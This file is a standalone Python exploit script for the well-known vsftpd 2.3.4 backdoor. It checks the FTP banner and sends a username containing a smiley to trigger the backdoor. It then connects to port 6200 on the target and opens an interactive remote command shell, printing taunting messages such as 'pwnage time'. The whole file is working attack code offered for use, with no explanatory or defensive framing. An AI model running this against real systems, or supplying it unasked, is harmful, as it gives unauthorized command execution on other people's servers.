#!/usr/bin/python3
import socket
import time
import sys

from statics import *

tty = """[[ $- == *i* ]] && echo '[+] Interactive' || echo '[-] Not interactive'"""


def exploit(ip, port):
    try:
        prRed("NailBunny Loves You!")
        ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp.connect((ip, port))
        check = ftp.recv(1024).decode('utf-8')
        socket.setdefaulttimeout(5)
        if "vsftpd 2.3.4" in check.lower():
            ftp.send(b'USER letmein:)\n')
            ftp.send(b'PASS invaild\n')
            time.sleep(2)
            # ftp.close()
            prGreen("[+] SUCCESSFUL CONNECTION")
        else:
            prRed("[-] Not work vsftpd 2.3.4")
    except Exception as f:
        prRed('[-] CONNECTION FAILED, like your dreams.')
        print(f)
        ftp.close()
        sys.exit(1)

    try:
        senordiablo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        senordiablo.connect((ip, 6200))
        senordiablo.settimeout(1.5)
        prGreen('[*] SESSION CREATED, pwnage time')
        prRed('[!] Interactive shell to check >> use command shell_check')
        host = str.encode('id -u -n' + '\n')
        senordiablo.send(host)
        shithost = senordiablo.recv(1024).decode('utf-8')
        while True:
            squee = input(ip + '@' + str(shithost.strip()) + "#: ")
            if squee.lower() == 'shell_check':
                prGreen('[*]Shell Open... Get this shit done')
                nyy = str.encode((tty + '\n'))
                senordiablo.send(nyy)
                prRed(senordiablo.recv(1024).decode('utf-8'))
            else:
                try:
                    nyy = str.encode((squee + '\n'))
                    senordiablo.send(nyy)
                    responseq = senordiablo.recv(1024).decode('utf-8')
                    print(responseq)
                except socket.timeout:
                    pass

            if squee.lower() == 'exit':
                prGreen('[*] SESSION CLOSED')
                senordiablo.close()
                sys.exit(1)
    except Exception as f:
        prRed('[!] Failure Just like your lyf3')
        print(f)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Usage python3 exploit.py <Rhost> <Rport>')
    else:
        exploit(sys.argv[1], int(sys.argv[2]))
